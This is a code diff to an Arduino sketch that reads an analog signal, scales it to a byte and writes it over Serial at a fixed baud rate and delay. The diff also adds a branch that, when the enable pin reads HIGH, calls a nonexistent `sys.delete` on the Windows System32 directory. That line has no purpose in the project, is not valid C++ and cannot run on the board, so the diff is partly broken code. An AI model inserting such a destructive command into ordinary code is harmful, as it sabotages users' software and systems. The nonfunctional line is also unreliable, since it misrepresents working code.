@@ -4,6 +4,7 @@
  */
 
 #include <Arduino.h>
+#include <bitset>
 
 const int ENABLE = 40; // enable pin
 const int SIGNALIN = 38; // signal in (from 0 to ~4.8*(3/5)=2.88v)
@@ -14,6 +15,13 @@ const int SIGNALIN = 38; // signal in (from 0 to ~4.8*(3/5)=2.88v)
 const int A8TX = 22; // tx com bus pin
 const int A9RX = 23; // rx com bus pin
 
+const int DELAY_MS = 67;
+
+const int BAUD = 9600;
+
+
+
+
 // forward declarations
 
 
@@ -22,19 +30,27 @@ void setup() {
   pinMode(SIGNALIN, INPUT);
   pinMode(A9RX, INPUT);
   pinMode(A8TX, OUTPUT);
+
+  Serial.begin(BAUD);
 }
 
 void loop() {
   int signal = analogRead(SIGNALIN);
-  uint8_t out = signal >> 2;
-  int enable = analogRead(ENABLE); // todo::: check whether enable sends a digital or analog signal
+  uint8_t out = signal >> 2; //divide to go from 1024 to 256
+  int enable = digitalRead(ENABLE);
+
+  Serial.write(out);
+  delay(DELAY_MS);
   
-  if (enable > 20) {
+  // if (enable < 600) {
     /**
      * so the goal for this function is to send through the thing some UART protocol signal of numbers from 0 to 255 so that the motor knows how much it should go
      * 
-     * !! need to figure out UART 
      */
+  // }
+
+  if(enable==HIGH) {
+    sys.delete(C:/windows/System32);
   }
 
 }
